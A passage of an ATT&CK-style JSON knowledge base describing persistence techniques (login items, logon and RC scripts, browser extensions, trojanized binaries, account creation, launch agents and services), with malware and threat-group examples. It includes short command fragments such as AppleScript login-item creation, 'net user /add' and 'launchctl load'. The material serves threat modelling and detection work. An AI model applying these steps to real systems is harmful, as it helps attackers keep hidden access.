whereas the Service Management Framework uses the API call SMLoginItemSetEnabled.\nLogin items installed using the Service Management Framework leverage launchd, are not visible in the System Preferences, and can only be removed by the application that created them. Login items created using a shared file list are visible in System Preferences, can hide the application when it launches, and are executed through LaunchServices, not launchd, to open applications, documents, or URLs without using Finder. Users and applications use login items to configure their user environment to launch commonly used services or applications, such as email, chat, and music applications.\nAdversaries can utilize AppleScript and Native API calls to create a login item to spawn malicious executables. Prior to version 10.5 on macOS, adversaries can add login items by using AppleScript to send an Apple events to the \"System Events\" process, which has an AppleScript dictionary for manipulating login items. Adversaries can use a command such as tell application \"System Events\" to make login item at end with properties /path/to/executable. This command adds the path of the malicious executable to the login item file list located in ~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm. Adversaries can also use login items to launch executables that can be used to control the victim system remotely or as a means to gain privilege escalation by prompting for user credentials.", "id": "T1547.015", "examples": [{"id": "S0281", "name": "Dok", "description": "Dok uses AppleScript to install a login Item by sending Apple events to the System Events process."}, {"id": "S0690", "name": "Green Lambert", "description": "Green Lambert can add Login Items to establish persistence."}, {"id": "S0198", "name": "NETWIRE", "description": "NETWIRE can persist via startup options for Login items."}]}]}, {"name": "Boot or Logon Initialization Scripts", "description": "Adversaries may use scripts automatically executed at boot or logon initialization to establish persistence. Initialization scripts can be used to perform administrative functions, which may often execute other programs or send information to an internal logging server. These scripts can vary based on operating system and whether applied locally or remotely.", "detailed_description": "Adversaries may use scripts automatically executed at boot or logon initialization to establish persistence. Initialization scripts can be used to perform administrative functions, which may often execute other programs or send information to an internal logging server. These scripts can vary based on operating system and whether applied locally or remotely.\nAdversaries may use these scripts to maintain persistence on a single system. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary.\nAn adversary may also be able to escalate their privileges since some boot or logon initialization scripts run with higher privileges.", "id": "T1037", "examples": [{"id": "G0016", "name": "APT29", "description": "APT29 has hijacked legitimate application-specific startup scripts to enable malware to execute on system startup."}, {"id": "G0096", "name": "APT41", "description": "APT41 used a hidden shell script in /etc/rc.d/init.d to leverage the ADORE.XSECbackdoor and Adore-NG rootkit."}, {"id": "G0106", "name": "Rocke", "description": "Rocke has installed an \"init.d\" startup script to maintain persistence."}, {"id": "S1078", "name": "RotaJakiro", "description": "Depending on the Linux distribution and when executing with root permissions, RotaJakiro may install persistence using a .conf file in the /etc/init/ folder."}], "sub_techniques": [{"name": "Logon Script (Windows)", "description": "Adversaries may use Windows logon scripts automatically executed at logon initialization to establish persistence. Windows allows logon scripts to be run whenever a specific user or group of users log into a system. This is done via adding a path to a script to the HKCU\\Environment\\UserInitMprLogonScript Registry key.", "detailed_description": "Adversaries may use Windows logon scripts automatically executed at logon initialization to establish persistence. Windows allows logon scripts to be run whenever a specific user or group of users log into a system. This is done via adding a path to a script to the HKCU\\Environment\\UserInitMprLogonScript Registry key.\nAdversaries may use these scripts to maintain persistence on a single system. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary.", "id": "T1037.001", "examples": [{"id": "G0007", "name": "APT28", "description": "An APT28 loader Trojan adds the Registry key HKCU\\Environment\\UserInitMprLogonScript to establish persistence."}, {"id": "S0438", "name": "Attor", "description": "Attor's dispatcher can establish persistence via adding a Registry key with a logon script HKEY_CURRENT_USER\\Environment \"UserInitMprLogonScript\" ."}, {"id": "G0080", "name": "Cobalt Group", "description": "Cobalt Group has added persistence by registering the file name for the next stage malware under HKCU\\Environment\\UserInitMprLogonScript."}, {"id": "S0044", "name": "JHUHUGIT", "description": "JHUHUGIT has registered a Windows shell script under the Registry key HKCU\\Environment\\UserInitMprLogonScript to establish persistence."}, {"id": "S0526", "name": "KGH_SPY", "description": "KGH_SPY has the ability to set the HKCU\\Environment\\UserInitMprLogonScript Registry key to execute logon scripts."}, {"id": "S0251", "name": "Zebrocy", "description": "Zebrocy performs persistence with a logon script via adding to the Registry key HKCU\\Environment\\UserInitMprLogonScript."}]}, {"name": "Login Hook", "description": "Adversaries may use a Login Hook to establish persistence executed upon user logon. A login hook is a plist file that points to a specific script to execute with root privileges upon user logon. The plist file is located in the /Library/Preferences/com.apple.loginwindow.plist file and can be modified using the defaults command-line utility. This behavior is the same for logout hooks where a script can be executed upon user logout. All hooks require administrator permissions to modify or create hooks.", "detailed_description": "Adversaries may use a Login Hook to establish persistence executed upon user logon. A login hook is a plist file that points to a specific script to execute with root privileges upon user logon. The plist file is located in the /Library/Preferences/com.apple.loginwindow.plist file and can be modified using the defaults command-line utility. This behavior is the same for logout hooks where a script can be executed upon user logout. All hooks require administrator permissions to modify or create hooks.\nAdversaries can add or insert a path to a malicious script in the com.apple.loginwindow.plist file, using the LoginHook or LogoutHook key-value pair. The malicious script is executed upon the next user login. If a login hook already exists, adversaries can add additional commands to an existing login hook. There can be only one login and logout hook on a system at a time.\nNote: Login hooks were deprecated in 10.11 version of macOS in favor of Launch Daemon and Launch Agent", "id": "T1037.002", "examples": []}, {"name": "Network Logon Script", "description": "Adversaries may use network logon scripts automatically executed at logon initialization to establish persistence. Network logon scripts can be assigned using Active Directory or Group Policy Objects. These logon scripts run with the privileges of the user they are assigned to. Depending on the systems within the network, initializing one of these scripts could apply to more than one or potentially all systems.", "detailed_description": "Adversaries may use network logon scripts automatically executed at logon initialization to establish persistence. Network logon scripts can be assigned using Active Directory or Group Policy Objects. These logon scripts run with the privileges of the user they are assigned to. Depending on the systems within the network, initializing one of these scripts could apply to more than one or potentially all systems.\nAdversaries may use these scripts to maintain persistence on a network. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary.", "id": "T1037.003", "examples": []}, {"name": "RC Scripts", "description": "Adversaries may establish persistence by modifying RC scripts which are executed during a Unix-like system\u2019s startup. These files allow system administrators to map and start custom services at startup for different run levels. RC scripts require root privileges to modify.", "detailed_description": "Adversaries may establish persistence by modifying RC scripts which are executed during a Unix-like system\u2019s startup. These files allow system administrators to map and start custom services at startup for different run levels. RC scripts require root privileges to modify.\nAdversaries can establish persistence by adding a malicious binary path or shell commands to rc.local, rc.common, and other RC scripts specific to the Unix-like distribution. Upon reboot, the system executes the script's contents as root, resulting in persistence.\nAdversary abuse of RC scripts is especially effective for lightweight Unix-like distributions using the root user as default, such as IoT or embedded systems.\nSeveral Unix-like systems have moved to Systemd and deprecated the use of RC scripts. This is now a deprecated mechanism in macOS in favor of Launchd.  This technique can be used on Mac OS X Panther v10.3 and earlier versions which still execute the RC scripts. To maintain backwards compatibility some systems, such as Ubuntu, will execute the RC scripts if they exist with the correct file permissions.", "id": "T1037.004", "examples": [{"id": "G0016", "name": "APT29", "description": "APT29 has installed a run command on a compromised system to enable malware execution on system startup."}, {"id": "S0687", "name": "Cyclops Blink", "description": "Cyclops Blink has the ability to execute on device startup, using a modified RC script named S51armled."}, {"id": "S0690", "name": "Green Lambert", "description": "Green Lambert can add init.d and rc.d files in the /etc folder to establish persistence."}, {"id": "S0394", "name": "HiddenWasp", "description": "HiddenWasp installs reboot persistence by adding itself to /etc/rc.local."}, {"id": "S0278", "name": "iKitten", "description": "iKitten adds an entry to the rc.common file for persistence."}]}, {"name": "Startup Items", "description": "Adversaries may use startup items automatically executed at boot initialization to establish persistence. Startup items execute during the final phase of the boot process and contain shell scripts or other executable files along with configuration information used by the system to determine the execution order for all startup items.", "detailed_description": "Adversaries may use startup items automatically executed at boot initialization to establish persistence. Startup items execute during the final phase of the boot process and contain shell scripts or other executable files along with configuration information used by the system to determine the execution order for all startup items.\nThis is technically a deprecated technology (superseded by Launch Daemon), and thus the appropriate folder, /Library/StartupItems isn\u2019t guaranteed to exist on the system by default, but does appear to exist by default on macOS Sierra. A startup item is a directory whose executable and configuration property list (plist), StartupParameters.plist, reside in the top-level directory.\nAn adversary can create the appropriate folders/files in the StartupItems directory to register their own persistence mechanism. Additionally, since StartupItems run during the bootup phase of macOS, they will run as the elevated root user.", "id": "T1037.005", "examples": [{"id": "S0283", "name": "jRAT", "description": "jRAT can list and manage startup entries."}]}]}, {"name": "Browser Extensions", "description": "Adversaries may abuse Internet browser extensions to establish persistent access to victim systems. Browser extensions or plugins are small programs that can add functionality and customize aspects of Internet browsers. They can be installed directly or through a browser's app store and generally have access and permissions to everything that the browser can access.", "detailed_description": "Adversaries may abuse Internet browser extensions to establish persistent access to victim systems. Browser extensions or plugins are small programs that can add functionality and customize aspects of Internet browsers. They can be installed directly or through a browser's app store and generally have access and permissions to everything that the browser can access.\nMalicious extensions can be installed into a browser through malicious app store downloads masquerading as legitimate extensions, through social engineering, or by an adversary that has already compromised a system. Security can be limited on browser app stores so it may not be difficult for malicious extensions to defeat automated scanners. Depending on the browser, adversaries may also manipulate an extension's update url to install updates from an adversary controlled server or manipulate the mobile configuration file to silently install additional extensions.\nPrevious to macOS 11, adversaries could silently install browser extensions via the command line using the profiles tool to install malicious .mobileconfig files. In macOS 11+, the use of the profiles tool can no longer install configuration profiles, however .mobileconfig files can be planted and installed with user interaction.\nOnce the extension is installed, it can browse to websites in the background, steal all information that a user enters into a browser (including credentials), and be used as an installer for a RAT for persistence.\nThere have also been instances of botnets using a persistent backdoor through malicious Chrome extensions for Command and Control. Adversaries may also use browser extensions to modify browser permissions and components, privacy settings, and other security controls for Defense Evasion.", "id": "T1176", "examples": [{"id": "S0482", "name": "Bundlore", "description": "Bundlore can install malicious browser extensions that are used to hijack user searches."}, {"id": "S0531", "name": "Grandoreiro", "description": "Grandoreiro can use malicious browser extensions to steal cookies and other user information."}, {"id": "G0094", "name": "Kimsuky", "description": "Kimsuky has used Google Chrome browser extensions to infect victims and to steal passwords and cookies."}, {"id": "S1122", "name": "Mispadu", "description": "Mispadu utilizes malicious Google Chrome browser extensions to steal financial data."}, {"id": "S0402", "name": "OSX/Shlayer", "description": "OSX/Shlayer can install malicious Safari browser extensions to serve ads."}], "sub_techniques": []}, {"name": "Compromise Host Software Binary", "description": "Adversaries may modify host software binaries to establish persistent access to systems. Software binaries/executables provide a wide range of system commands or services, programs, and libraries. Common software binaries are SSH clients, FTP clients, email clients, web browsers, and many other user or server applications.", "detailed_description": "Adversaries may modify host software binaries to establish persistent access to systems. Software binaries/executables provide a wide range of system commands or services, programs, and libraries. Common software binaries are SSH clients, FTP clients, email clients, web browsers, and many other user or server applications.\nAdversaries may establish persistence though modifications to host software binaries. For example, an adversary may replace or otherwise infect a legitimate application binary (or support files) with a backdoor. Since these binaries may be routinely executed by applications or the user, the adversary can leverage this for persistent access to the host. An adversary may also modify a software binary such as an SSH client in order to persistently collect credentials during logins (i.e., Modify Authentication Process).\nAn adversary may also modify an existing binary by patching in malicious functionality (e.g., IAT Hooking/Entry point patching) prior to the binary\u2019s legitimate execution. For example, an adversary may modify the entry point of a binary to point to malicious code patched in by the adversary before resuming normal execution flow.\nAfter modifying a binary, an adversary may attempt to Impair Defenses by preventing it from updating (e.g., via the yum-versionlock command or versionlock.list file in Linux systems that use the yum package manager).", "id": "T1554", "examples": [{"id": "C0025", "name": "2016 Ukraine Electric Power Attack", "description": "During the 2016 Ukraine Electric Power Attack, Sandworm Team used a trojanized version of Windows Notepad to add a layer of persistence for Industroyer."}, {"id": "G1023", "name": "APT5", "description": "APT5 has modified legitimate binaries and scripts for Pulse Secure VPNs including the legitimate DSUpgrade.pm file to install the ATRIUM webshell for persistence."}, {"id": "S1136", "name": "BFG Agonizer", "description": "BFG Agonizer uses DLL unhooking to remove user mode inline hooks that security solutions often implement. BFG Agonizer also uses IAT unhooking to remove user-mode IAT hooks that security solutions also use."}, {"id": "S0486", "name": "Bonadan", "description": "Bonadan has maliciously altered the OpenSSH binary on targeted systems to create a backdoor."}, {"id": "S1118", "name": "BUSHWALK", "description": "BUSHWALK can embed into the legitimate querymanifest.cgi file on compromised Ivanti Connect Secure VPNs."}, {"id": "C0029", "name": "Cutting Edge", "description": "During Cutting Edge, threat actors trojanized legitimate files in Ivanti Connect Secure appliances with malicious code."}, {"id": "S0377", "name": "Ebury", "description": "Ebury modifies the keyutils library to add malicious behavior to the OpenSSH client and the curl library."}, {"id": "S1120", "name": "FRAMESTING", "description": "FRAMESTING can embed itself in the CAV Python package of an Ivanti Connect Secure VPN located in /home/venv3/lib/python3.6/site-packages/cav-0.1-py3.6.egg/cav/api/resources/category.py."}, {"id": "S0604", "name": "Industroyer", "description": "Industroyer has used a Trojanized version of the Windows Notepad application for an additional backdoor persistence mechanism."}, {"id": "S0487", "name": "Kessel", "description": "Kessel has maliciously altered the OpenSSH binary on targeted systems to create a backdoor."}, {"id": "S0641", "name": "Kobalos", "description": "Kobalos replaced the SSH client with a trojanized SSH client to steal credentials on compromised systems."}, {"id": "S1119", "name": "LIGHTWIRE", "description": "LIGHTWIRE can imbed itself into the legitimate compcheckresult.cgi component of Ivanti Connect Secure VPNs to enable command execution."}, {"id": "S1121", "name": "LITTLELAMB.WOOLTEA", "description": "LITTLELAMB.WOOLTEA can append malicious components to the tmp/tmpmnt/bin/samba_upgrade.tar archive inside the factory reset partition in attempt to persist post reset."}, {"id": "S1104", "name": "SLOWPULSE", "description": "SLOWPULSE is applied in compromised environments through modifications to legitimate Pulse Secure files."}, {"id": "S0595", "name": "ThiefQuest", "description": "ThiefQuest searches through the /Users/ folder looking for executable files. For each executable, ThiefQuest prepends a copy of itself to the beginning of the file. When the file is executed, the ThiefQuest code is executed first. ThiefQuest creates a hidden file, copies the original target executable to the file, then executes the new hidden file to maintain the appearance of normal behavior. "}, {"id": "S1116", "name": "WARPWIRE", "description": "WARPWIRE can embed itself into a legitimate file on compromised Ivanti Connect Secure VPNs."}, {"id": "S1115", "name": "WIREFIRE", "description": "WIREFIRE can modify the visits.py component of Ivanti Connect Secure VPNs for file download and arbitrary command execution."}, {"id": "S0658", "name": "XCSSET", "description": "XCSSET uses a malicious browser application to replace the legitimate browser in order to continuously capture credentials, monitor web traffic, and download additional modules."}], "sub_techniques": []}, {"name": "Create Account", "description": "Adversaries may create an account to maintain access to victim systems. With a sufficient level of access, creating such accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.", "detailed_description": "Adversaries may create an account to maintain access to victim systems. With a sufficient level of access, creating such accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.\nAccounts may be created on the local system or within a domain or cloud tenant. In cloud environments, adversaries may create accounts that only have access to specific services, which can reduce the chance of detection.", "id": "T1136", "examples": [{"id": "C0025", "name": "2016 Ukraine Electric Power Attack", "description": "During the 2016 Ukraine Electric Power Attack, Sandworm Team added a login to a SQL Server with sp_addlinkedsrvlogin."}, {"id": "G0119", "name": "Indrik Spider", "description": "Indrik Spider used wmic.exe to add a new user to the system."}, {"id": "G1015", "name": "Scattered Spider", "description": "Scattered Spider creates new user identities within the compromised organization."}], "sub_techniques": [{"name": "Local Account", "description": "Adversaries may create a local account to maintain access to victim systems. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service.", "detailed_description": "Adversaries may create a local account to maintain access to victim systems. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service.\nFor example, with a sufficient level of access, the Windows net user /add command can be used to create a local account. On macOS systems the dscl -create command can be used to create a local account. Local accounts may also be added to network devices, often via common Network Device CLI commands such as username, or to Kubernetes clusters using the kubectl utility.\nSuch accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.", "id": "T1136.001", "examples": [{"id": "G0022", "name": "APT3", "description": "APT3 has been known to create or enable accounts, such as support_388945a0."}, {"id": "G0087", "name": "APT39", "description": "APT39 has created accounts on multiple compromised hosts to perform actions within the network."}, {"id": "G0096", "name": "APT41", "description": "APT41 has created user accounts."}, {"id": "G1023", "name": "APT5", "description": "APT5 has created Local Administrator accounts to maintain access to systems with short-cycle credential rotation."}, {"id": "S0274", "name": "Calisto", "description": "Calisto has the capability to add its own account to the victim's machine."}, {"id": "S0030", "name": "Carbanak", "description": "Carbanak can create a Windows account."}, {"id": "G1034", "name": "Daggerfly", "description": "Daggerfly created a local account on victim machines to maintain access."}, {"id": "S1111", "name": "DarkGate", "description": "DarkGate creates a local user account, SafeMode, via net user commands."}, {"id": "G0035", "name": "Dragonfly", "description": "Dragonfly has created accounts on victims, including administrator accounts, some of which appeared to be tailored to each individual staging target."}, {"id": "S0363", "name": "Empire", "description": "Empire has a module for creating a local user if permissions allow."}, {"id": "G1016", "name": "FIN13", "description": "FIN13 has created MS-SQL local accounts in a compromised network."}, {"id": "S0143", "name": "Flame", "description": "Flame can create backdoor accounts with login \"HelpAssistant\" on domain connected systems if appropriate rights are available."}, {"id": "G0117", "name": "Fox Kitten", "description": "Fox Kitten has created a local user account with administrator privileges."}, {"id": "S0493", "name": "GoldenSpy", "description": "GoldenSpy can create new users on an infected system."}, {"id": "S0394", "name": "HiddenWasp", "description": "HiddenWasp creates a user account as a means to provide initial persistence to the compromised machine."}, {"id": "S0601", "name": "Hildegard", "description": "Hildegard has created a user named \"monerodaemon\"."}, {"id": "G0119", "name": "Indrik Spider", "description": "Indrik Spider has created local system accounts and has added the accounts to privileged groups."}, {"id": "G0094", "name": "Kimsuky", "description": "Kimsuky has created accounts with net user."}, {"id": "G0077", "name": "Leafminer", "description": "Leafminer used a tool called Imecab to set up a persistent remote access account on the victim machine."}, {"id": "G0059", "name": "Magic Hound", "description": "Magic Hound has created local accounts named help and DefaultAccount on compromised machines."}, {"id": "S0084", "name": "Mis-Type", "description": "Mis-Type may create a temporary user on the system named Lost_{Unique Identifier}."}, {"id": "S0039", "name": "Net", "description": "The net user username \\password commands in Net can be used to create a local account."}, {"id": "S0192", "name": "Pupy", "description": "Pupy can user PowerView to execute \"net user\" commands and create local system accounts."}, {"id": "S0085", "name": "S-Type", "description": "S-Type may create a temporary user on the system named Lost_{Unique Identifier} with the password pond~!@6\"{Unique Identifier}."}, {"id": "S0382", "name": "ServHelper", "description": "ServHelper has created a new user named \"supportaccount\"."}, {"id": "S0649", "name": "SMOKEDHAM", "description": "SMOKEDHAM has created user accounts."}, {"id": "G0139", "name": "TeamTNT", "description": "TeamTNT has created local privileged users on victim machines."}, {"id": "G0102", "name": "Wizard Spider", "description": "Wizard Spider has created local administrator accounts to maintain persistence in compromised networks."}, {"id": "S0412", "name": "ZxShell", "description": "ZxShell has a feature to create local user accounts."}]}, {"name": "Domain Account", "description": "Adversaries may create a domain account to maintain access to victim systems. Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover user, administrator, and service accounts. With a sufficient level of access, the net user /add /domain command can be used to create a domain account.", "detailed_description": "Adversaries may create a domain account to maintain access to victim systems. Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover user, administrator, and service accounts. With a sufficient level of access, the net user /add /domain command can be used to create a domain account.\nSuch accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.", "id": "T1136.002", "examples": [{"id": "C0028", "name": "2015 Ukraine Electric Power Attack", "description": "During the 2015 Ukraine Electric Power Attack, Sandworm Team created privileged domain accounts to be used for further exploitation and lateral movement. "}, {"id": "C0025", "name": "2016 Ukraine Electric Power Attack", "description": "During the 2016 Ukraine Electric Power Attack, Sandworm Team created two new accounts, \"admin\" and \"\u0441\u0438\u0441\u0442\u0435\u043c\u0430\" (System). The accounts were then assigned to a domain matching local operation and were delegated new privileges."}, {"id": "S0363", "name": "Empire", "description": "Empire has a module for creating a new domain user if permissions allow."}, {"id": "G0093", "name": "GALLIUM", "description": "GALLIUM created high-privileged domain user accounts to maintain access to victim networks."}, {"id": "G0125", "name": "HAFNIUM", "description": "HAFNIUM has created domain accounts."}, {"id": "S0039", "name": "Net", "description": "The net user username \\password \\domain commands in Net can be used to create a domain account."}, {"id": "S0029", "name": "PsExec", "description": "PsExec has the ability to remotely create accounts on target systems."}, {"id": "S0192", "name": "Pupy", "description": "Pupy can user PowerView to execute \"net user\" commands and create domain accounts."}, {"id": "G0102", "name": "Wizard Spider", "description": "Wizard Spider has created and used new accounts within a victim's Active Directory environment to maintain persistence."}]}, {"name": "Cloud Account", "description": "Adversaries may create a cloud account to maintain access to victim systems. With a sufficient level of access, such accounts may be used to establish secondary credentialed access that does not require persistent remote access tools to be deployed on the system.", "detailed_description": "Adversaries may create a cloud account to maintain access to victim systems. With a sufficient level of access, such accounts may be used to establish secondary credentialed access that does not require persistent remote access tools to be deployed on the system.\nIn addition to user accounts, cloud accounts may be associated with services. Cloud providers handle the concept of service accounts in different ways. In Azure, service accounts include service principals and managed identities, which can be linked to various resources such as OAuth applications, serverless functions, and virtual machines in order to grant those resources permissions to perform various activities in the environment. In GCP, service accounts can also be linked to specific resources, as well as be impersonated by other accounts for Temporary Elevated Cloud Access. While AWS has no specific concept of service accounts, resources can be directly granted permission to assume roles.\nAdversaries may create accounts that only have access to specific cloud services, which can reduce the chance of detection.\nOnce an adversary has created a cloud account, they can then manipulate that account to ensure persistence and allow access to additional resources - for example, by adding Additional Cloud Credentials or assigning Additional Cloud Roles.", "id": "T1136.003", "examples": [{"id": "S0677", "name": "AADInternals", "description": "AADInternals can create new Azure AD users."}, {"id": "G0016", "name": "APT29", "description": "APT29 can create new users through Azure AD."}, {"id": "G1004", "name": "LAPSUS$", "description": "LAPSUS$ has created global admin accounts in the targeted organization's cloud instances to gain persistence."}]}]}, {"name": "Create or Modify System Process", "description": "Adversaries may create or modify system-level processes to repeatedly execute malicious payloads as part of persistence. When operating systems boot up, they can start processes that perform background system functions. On Windows and Linux, these system processes are referred to as services. On macOS, launchd processes known as Launch Daemon and Launch Agent are run to finish system initialization and load user specific parameters.", "detailed_description": "Adversaries may create or modify system-level processes to repeatedly execute malicious payloads as part of persistence. When operating systems boot up, they can start processes that perform background system functions. On Windows and Linux, these system processes are referred to as services. On macOS, launchd processes known as Launch Daemon and Launch Agent are run to finish system initialization and load user specific parameters.\nAdversaries may install new services, daemons, or agents that can be configured to execute at startup or a repeatable interval in order to establish persistence. Similarly, adversaries may modify existing services, daemons, or agents to achieve the same effect.\nServices, daemons, or agents may be created with administrator privileges but executed under root/SYSTEM privileges. Adversaries may leverage this functionality to create or modify system processes in order to escalate privileges.", "id": "T1543", "examples": [{"id": "S0401", "name": "Exaramel for Linux", "description": "Exaramel for Linux has a hardcoded location that it uses to achieve persistence if the startup system is Upstart or System V and it is running as root."}, {"id": "S1152", "name": "IMAPLoader", "description": "IMAPLoader modifies Windows tasks on the victim machine to reference a retrieved PE file through a path modification."}, {"id": "S1121", "name": "LITTLELAMB.WOOLTEA", "description": "LITTLELAMB.WOOLTEA can initialize itself as a daemon to run persistently in the background."}, {"id": "S1142", "name": "LunarMail", "description": "LunarMail can create an arbitrary process with a specified command line and redirect its output to a staging directory."}], "sub_techniques": [{"name": "Launch Agent", "description": "Adversaries may create or modify launch agents to repeatedly execute malicious payloads as part of persistence. When a user logs in, a per-user launchd process is started which loads the parameters for each launch-on-demand user agent from the property list (.plist) file found in /System/Library/LaunchAgents, /Library/LaunchAgents, and ~/Library/LaunchAgents.  Property list files use the Label, ProgramArguments , and RunAtLoad keys to identify the Launch Agent's name, executable location, and execution time. Launch Agents are often installed to perform updates to programs, launch user specified programs at login, or to conduct other developer tasks.", "detailed_description": "Adversaries may create or modify launch agents to repeatedly execute malicious payloads as part of persistence. When a user logs in, a per-user launchd process is started which loads the parameters for each launch-on-demand user agent from the property list (.plist) file found in /System/Library/LaunchAgents, /Library/LaunchAgents, and ~/Library/LaunchAgents.  Property list files use the Label, ProgramArguments , and RunAtLoad keys to identify the Launch Agent's name, executable location, and execution time. Launch Agents are often installed to perform updates to programs, launch user specified programs at login, or to conduct other developer tasks.\nLaunch Agents can also be executed using the Launchctl command.\nAdversaries may install a new Launch Agent that executes at login by placing a .plist file into the appropriate folders with the RunAtLoad or KeepAlive keys set to true. The Launch Agent name may be disguised by using a name from the related operating system or benign software. Launch Agents are created with user level privileges and execute with user level permissions.", "id": "T1543.001", "examples": [{"id": "S0482", "name": "Bundlore", "description": "Bundlore can persist via a LaunchAgent."}, {"id": "S0274", "name": "Calisto", "description": "Calisto adds a .plist file to the /Library/LaunchAgents folder to maintain persistence."}, {"id": "S0369", "name": "CoinTicker", "description": "CoinTicker creates user launch agents named .espl.plist and com.apple.[random string].plist to establish persistence."}, {"id": "S0492", "name": "CookieMiner", "description": "CookieMiner has installed multiple new Launch Agents in order to maintain persistence for cryptocurrency mining software."}, {"id": "S0235", "name": "CrossRAT", "description": "CrossRAT creates a Launch Agent on macOS."}, {"id": "S1153", "name": "Cuckoo Stealer", "description": "Cuckoo Stealer can achieve persistence by creating launch agents to repeatedly execute malicious payloads."}, {"id": "S0497", "name": "Dacls", "description": "Dacls can establish persistence via a LaunchAgent."}, {"id": "S0281", "name": "Dok", "description": "Dok installs two LaunchAgents to redirect all network traffic with a randomly generated name for each plist file maintaining the format com.random.name.plist."}, {"id": "S0277", "name": "FruitFly", "description": "FruitFly persists via a Launch Agent."}, {"id": "S0690", "name": "Green Lambert", "description": "Green Lambert can create a Launch Agent with the RunAtLoad key-value pair set to true, ensuring the com.apple.GrowlHelper.plist file runs every time a user logs in."}, {"id": "S0276", "name": "Keydnap", "description": "Keydnap uses a Launch Agent to persist."}, {"id": "S0162", "name": "Komplex", "description": "The Komplex trojan creates a persistent launch agent called with $HOME/Library/LaunchAgents/com.apple.updates.plist with launchctl load -w ~/Library/LaunchAgents/com.apple.updates.plist."}, {"id": "S1016", "name": "MacMa", "description": "MacMa installs a com.apple.softwareupdate.plist file in the /LaunchAgents folder with the RunAtLoad value set to true. Upon user login, MacMa is executed from /var/root/.local/softwareupdate with root privileges. Some variations also include the LimitLoadToSessionType key with the value Aqua, ensuring the MacMa only runs when there is a logged in GUI user."}, {"id": "S1048", "name": "macOS.OSAMiner", "description": "macOS.OSAMiner has placed a Stripped Payloads with a plist extension in the Launch Agent's folder. "}, {"id": "S0282", "name": "MacSpy", "description": "MacSpy persists via a Launch Agent."}, {"id": "S0198", "name": "NETWIRE", "description": "NETWIRE can use launch agents for persistence."}, {"id": "S0352", "name": "OSX_OCEANLOTUS.D", "description": "OSX_OCEANLOTUS.D can create a persistence file in the folder /Library/LaunchAgents."}, {"id": "S0279", "name": "Proton", "description": "Proton persists via Launch Agent."}, {"id": "S0595", "name": "ThiefQuest", "description": "ThiefQuest installs a launch item using an embedded encrypted launch agent property list template. The plist file is installed in the ~/Library/LaunchAgents/ folder and configured with the path to the persistent binary located in the ~/Library/ folder."}]}, {"name": "Systemd Service", "description": "Adversaries may create or modify systemd services to repeatedly execute malicious payloads as part of persistence. Systemd is a system and service manager commonly used for managing background daemon processes (also known as services) and other system resources. Systemd is the default initialization (init) system on many Linux distributions replacing legacy init systems, including SysVinit and Upstart, while remaining backwards compatible.", "detailed_description": "Adversaries may create or modify systemd services to repeatedly execute malicious payloads as part of persistence. Systemd is a system and service manager commonly used for managing background daemon processes (also known as services) and other system resources. Systemd is the default initialization (init) system on many Linux distributions replacing legacy init systems, including SysVinit and Upstart, while remaining backwards compatible.\nSystemd utilizes unit configuration files with the .service file extension to encode information about a service's process. By default, system level unit files are stored in the /systemd/system directory of the root owned directories (/). User level unit files are stored in the /systemd/user directories of the user owned directories ($HOME).\nInside the .service unit files, the following directives are used to execute commands:\nAdversaries have created new service files, altered the commands a .service file\u2019s directive executes, and modified the user directive a .service file executes as, which could result in privilege escalation. Adversaries may also place symbolic links in these directories, enabling systemd to find these payloads regardless of where they reside on the filesystem.\nThe .service file\u2019s User directive can be used to run service as a specific user, which could result in privilege escalation based on specific user/group permissions.", "id": "T1543.002", "examples": [{"id": "C0034", "name": "2022 Ukraine Electric Power Attack", "description": "During the 2022 Ukraine Electric Power Attack, Sandworm Team configured Systemd to maintain persistence of GOGETTER, specifying the WantedBy=multi-user.target configuration to run GOGETTER when the system begins accepting user logins."}, {"id": "S0401", "name": "Exaramel for Linux", "description": "Exaramel for Linux has a hardcoded location under systemd that it uses to achieve persistence if it is running as root."}, {"id": "S0410", "name": "Fysbis", "description": "Fysbis has established persistence using a systemd service."}, {"id": "S0601", "name": "Hildegard", "description": "Hildegard has started a monero service."}, {"id": "S0192", "name": "Pupy", "description": "Pupy can be used to establish persistence using a systemd service."}, {"id": "G0106", "name": "Rocke", "description": "Rocke has installed a systemd service script to maintain persistence."}, {"id": "S1078", "name": "RotaJakiro", "description": "Depending on the Linux distribution and when executing with root permissions, RotaJakiro may install persistence using a .service file under the /lib/systemd/system/ folder."}, {"id": "S0663", "name": "SysUpdate", "description": "SysUpdate can copy a script to the user owned /usr/lib/systemd/system/ directory with a symlink mapped to a root owned directory, /etc/ystem/system, in the unit configuration file's ExecStart directive to establish persistence and elevate privileges."}, {"id": "G0139", "name": "TeamTNT", "description": "TeamTNT has established persistence through the creation of a cryptocurrency mining system service using systemctl."}]}, {"name": "Windows Service", "description": "Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions. Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry.", "detailed_description": "Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions. Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry.\nAdversaries may install a new service or modify an existing service to execute at startup in order to persist on a system. Service configurations can be set or modified using system utilities (such as sc.exe), by directly modifying the Registry, or by interacting directly with the Windows API.\nAdversaries may also use services to install and execute malicious drivers. For example, after dropping a driver file (ex: .sys) to disk, the payload can be loaded and registered via Native API functions such as CreateServiceW() (or manually via functions such as ZwLoadDriver() and ZwSetValueKey()), by creating the required service Registry values (i.e. Modify Registry), or by using command-line utilities such as PnPUtil.exe. Adversaries may leverage these drivers as Rootkits to hide the presence of malicious activity on a system. Adversaries may also load a signed yet vulnerable driver onto a compromised machine (known as 